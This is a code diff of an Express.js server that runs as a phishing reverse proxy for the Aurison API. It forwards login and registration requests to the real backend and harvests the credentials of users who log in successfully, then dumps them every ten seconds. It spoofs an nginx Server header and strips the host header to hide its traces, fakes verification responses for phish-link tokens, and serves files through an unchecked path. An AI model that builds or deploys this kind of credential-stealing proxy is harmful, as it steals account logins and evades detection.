@@ -15,41 +15,79 @@ const PROD = 'https://api.aurison.app';
 const AGENT = new https.Agent({ rejectUnauthorized: false });
 const app = express();
 
+
 //vars
-var HARVESTED_CREDENTIALS = [];
+var CREDENTIALS = [];
 
 
-// Serve static files from the "public" directory
-app.use('/static', express.static('static'));
 
 //middlwares
 app.use(parseJson());
 
+app.use((req, res, next) => {
+    //This route is kinda uneccessary. 
+    res.removeHeader('X-Powered-By');
+    res.setHeader('Server', 'nginx/1.18.0 (Ubuntu)');
+    next();
+})
+
+
+app.use('/static', express.static('static'));
+
 
 //home
-app.get('/', (req, res)=>{
+app.get('*', (req, res, next)=>{
+    //check if react is trying to access a static file and manually serve it.
+    //This happenes when the route doesn't begin with /static, so the static
+    //middleware doesn't catch it, e.g /test/what/static/bla.js
+    if (req.path.includes("/static")) {
+        const index = req.path.indexOf("/static");
+        const resource = req.path.substring(index); //path to static file.
+
+        return res.sendFile(__dirname + resource);
+    }
+
+    //just return the base html otherwise.
     return res.sendFile(__dirname + '/index.html');
 });
 
 
-app.get('/:anypath(*)', (req, res)=>{
-    return res.sendFile(__dirname + '/index.html');
+app.post('/verify', (req, res, next) => {
+    //fake a valid response to trick react if its a phish link.
+    //otherwise just pass it along to the proxy
+    if (req.body.action === "info" && req.body.token.endsWith("700r")) {
+        //probably grab this from somewhere later on.
+        var payload = {
+            error:false,
+            data: {
+                title:"",
+                forenames:"",
+                surname:"",
+                organisation:""
+            }
+        }
+        return res.status(200).json(payload);
+    }
+
+    return next();
 });
 
 
-//proxy api requests
-app.all('/:path(*)', async (req, res) =>{
-    const path = req.params.path;   //grab route
+//proxy api post requests.
+app.post('*', async (req, res) =>{
+    const path = req.path;   //grab route
 
     try {
-        const { method, headers, body} = req;    //grab relevant info from req
-  
+        const {headers, body} = req;    //grab relevant info from req
+        
+        delete headers["host"]       //really doesn't matter, just leaves less of a trace.
+
         // Make request to Aurison
         const response = await axios({
-          method: method,
+          method: 'POST',
           headers: headers,
           data: body,
-          url: `${STAGING}/${path}`,
+          url: `${STAGING + path}`,
           httpsAgent: AGENT
         });   
         
@@ -62,11 +100,11 @@ app.all('/:path(*)', async (req, res) =>{
         });
         
         //Grab login creds
-        if (response.data.error === false && path === 'login') harvestCredentials(req, HARVESTED_CREDENTIALS);
+        if (response.data.error === false && path === 'login') harvestCredentials(req, CREDENTIALS);
 
         //Grab verify creds
-        if (response.data.error === false && path == 'verifiy') {
-            if (req.data.action === "register") harvestCredentials(req, HARVESTED_CREDENTIALS);
+        if (response.data.error === false && path == 'verify') {
+            if (req.data.action === "register") harvestCredentials(req, CREDENTIALS);
         }
 
 
@@ -77,7 +115,7 @@ app.all('/:path(*)', async (req, res) =>{
             return res.status(error.response.status).json(error.response.data);
         }
 
-        // console.log(error);
+        console.log(error);
         return res.status(400).json({
             error: true,
             error_log: 'Unknown Error'
@@ -89,7 +127,7 @@ app.all('/:path(*)', async (req, res) =>{
 
 //launch
 app.listen(PORT, () => {
-    setInterval(() => credsDump(HARVESTED_CREDENTIALS), 10000);   //dump any creds in queue every 10 seconds.
+    setInterval(() => credsDump(CREDENTIALS), 10000);   //dump any creds in queue every 10 seconds.
 
     console.log(`Server is listening on port ${PORT}`);
 });
